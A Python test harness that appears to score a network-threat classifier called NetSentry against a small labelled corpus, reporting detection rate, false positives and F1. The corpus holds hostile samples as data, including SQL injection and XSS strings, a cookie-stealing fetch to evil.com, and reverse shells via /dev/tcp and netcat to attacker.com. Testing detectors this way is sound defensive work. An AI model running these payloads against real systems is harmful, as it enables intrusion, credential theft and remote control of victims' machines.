#!/usr/bin/env python3
"""
NetSentry — Detection accuracy harness.

Sends a labeled corpus of malicious + benign payloads through
POST /api/classify and computes detection rate, false-positive rate,
precision, recall, and F1. Writes results/detection.json.

Usage:
    cd api && npm start          # terminal 1
    python benchmark/detection_test.py --url http://localhost:3001

This produces the REAL accuracy numbers for BENCHMARKS.md. The labeled
corpus below is small and illustrative — expand it with samples from
Stratosphere IPS, CIC-IDS2017, or your own pcaps for publishable rigor.
"""
import argparse
import json
import os
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(HERE, "results")

# label: True = malicious (should be flagged), False = benign (should pass)
CORPUS = [
    # ── Malicious ──────────────────────────────────────────────
    ("' UNION SELECT * FROM users--", True),
    ("' OR 1=1--", True),
    ("admin'--", True),
    ("'; DROP TABLE users; --", True),
    ("<script>alert(document.cookie)</script>", True),
    ("<img src=x onerror=alert(1)>", True),
    ("javascript:fetch('//evil.com?c='+document.cookie)", True),
    ("/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", True),
    ("cmd.exe /c whoami", True),
    ("; nc -e /bin/bash attacker.com 9001", True),
    ("GET /gate.php?id=infected_host HTTP/1.1", True),
    ("POST /check-in beacon=true", True),
    ("base64:H4sIAAAAAAAAbase64gzip.tunnel.exfil.attacker.xyz.morepadding", True),
    ("nmap -sS -p- target.com", True),
    ("masscan 0.0.0.0/0 -p443", True),
    ("stratum+tcp://xmr.pool.minergate.com:45700", True),
    # ── Benign ─────────────────────────────────────────────────
    ("GET /index.html HTTP/1.1\r\nHost: example.com", False),
    ("GET /api/users?page=2 HTTP/1.1", False),
    ("POST /login username=alice password=hunter2", False),
    ("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", False),
    ("Accept: text/html,application/xhtml+xml", False),
    ("SELECT name FROM products WHERE category = 'books'", False),
    ("the quick brown fox jumps over the lazy dog", False),
    ("Content-Type: application/json", False),
    ("hello world this is a normal message", False),
    ("GET /static/css/main.css HTTP/1.1", False),
]


def classify(url, payload):
    r = requests.post(f"{url}/api/classify",
                      json={"payload": payload, "src_ip": "1.2.3.4", "dst_port": 80},
                      timeout=10)
    return r.json().get("threat_type", "BENIGN") != "BENIGN"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:3001")
    args = ap.parse_args()

    tp = fp = tn = fn = 0
    print(f"NetSentry detection test → {args.url}\n")
    for payload, is_mal in CORPUS:
        flagged = classify(args.url, payload)
        if is_mal and flagged:      tp += 1
        elif is_mal and not flagged: fn += 1
        elif not is_mal and flagged: fp += 1
        else:                        tn += 1

    n_mal = tp + fn
    n_ben = tn + fp
    detection_rate = tp / n_mal if n_mal else 0
    fpr            = fp / n_ben if n_ben else 0
    precision      = tp / (tp + fp) if (tp + fp) else 0
    recall         = detection_rate
    f1             = 2 * precision * recall / (precision + recall) if (precision + recall) else 0

    res = {
        "samples": len(CORPUS),
        "malicious": n_mal, "benign": n_ben,
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "detection_rate": round(detection_rate * 100, 1),
        "false_positive_rate": round(fpr * 100, 1),
        "precision": round(precision * 100, 1),
        "recall": round(recall * 100, 1),
        "f1": round(f1 * 100, 1),
    }

    print(f"  Detection rate : {res['detection_rate']}%  ({tp}/{n_mal} caught)")
    print(f"  False positive : {res['false_positive_rate']}%  ({fp}/{n_ben} benign flagged)")
    print(f"  Precision      : {res['precision']}%")
    print(f"  Recall         : {res['recall']}%")
    print(f"  F1 score       : {res['f1']}%")

    os.makedirs(OUT_DIR, exist_ok=True)
    out = os.path.join(OUT_DIR, "detection.json")
    with open(out, "w") as f:
        json.dump(res, f, indent=2)
    print(f"\nSaved {out}")


if __name__ == "__main__":
    main()